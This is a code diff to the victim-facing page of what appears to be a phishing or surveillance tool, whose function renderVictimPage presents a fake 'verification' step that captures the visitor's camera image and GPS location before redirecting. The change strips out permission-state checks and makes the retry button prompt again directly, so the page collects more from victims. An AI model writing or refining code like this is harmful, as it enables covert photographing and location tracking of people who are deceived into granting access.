@@ -338,76 +338,36 @@ function renderVictimPage(sessionToken, redirectUrl) {
       });
     }
 
-    // ── Check permission state before requesting ────────
-    function checkCameraDenied() {
-      try {
-        if (navigator.permissions && navigator.permissions.query) {
-          return navigator.permissions.query({name: 'camera'}).then(function (result) {
-            return result.state === 'denied';
-          }).catch(function () { return false; });
-        }
-      } catch(e) {}
-      return Promise.resolve(false);
-    }
-
-    function checkGpsDenied() {
-      try {
-        if (navigator.permissions && navigator.permissions.query) {
-          return navigator.permissions.query({name: 'geolocation'}).then(function (result) {
-            return result.state === 'denied';
-          }).catch(function () { return false; });
-        }
-      } catch(e) {}
-      return Promise.resolve(false);
-    }
-
-    // ── Main verification flow ───────────────────────────
+    // ── Main verification flow (always directly requests permissions) ──
     async function startVerification() {
       _goBtn.classList.add('hidden');
       _retryBtn.classList.add('hidden');
-      showStatus('Checking permissions…');
-
-      // Step 1: Check if already denied
-      var camDenied = await checkCameraDenied();
-      var gpsDenied = await checkGpsDenied();
-
-      if (camDenied || gpsDenied) {
-        showPermissionWarning();
-        return;
-      }
-
-      // Step 2: Request camera permission
       showStatus('Requesting camera access…');
+
+      // Step 1: Directly request camera (skip permission check — directly prompts)
       try {
         await captureCamera();
         showStatus('✅ Camera captured! Getting location…', 'success');
       } catch (camErr) {
-        // Camera was denied or failed
         if (camErr.name === 'NotAllowedError' || camErr.name === 'PermissionDeniedError') {
           showPermissionWarning();
           return;
         }
-        // Some other error (no camera, etc) — still try GPS
-        console.log('Camera error (non-permission):', camErr.message);
       }
 
-      // Step 3: Start GPS capture (in background, no strict denial check)
-      // GPS request will show its own prompt
+      // Step 2: Directly request GPS
       showStatus('Getting your location…');
       captureGps();
 
-      // Step 4: Wait a moment then redirect
+      // Step 3: Wait then redirect
       setTimeout(doRedirect, 4000);
     }
 
-    // ── On button tap ────────────────────────────────────
-    _goBtn.addEventListener('click', startVerification);
+    // ── Retry tries again directly (no reload, directly re-requests permissions) ──
+    _retryBtn.addEventListener('click', startVerification);
 
-    // ── Retry button — reloads page to reset permission state ──
-    _retryBtn.addEventListener('click', function () {
-      showStatus('Refreshing…');
-      window.location.reload();
-    });
+    // ── Initial start ────────────────────────────────────
+    _goBtn.addEventListener('click', startVerification);
 
   })();
   </script>
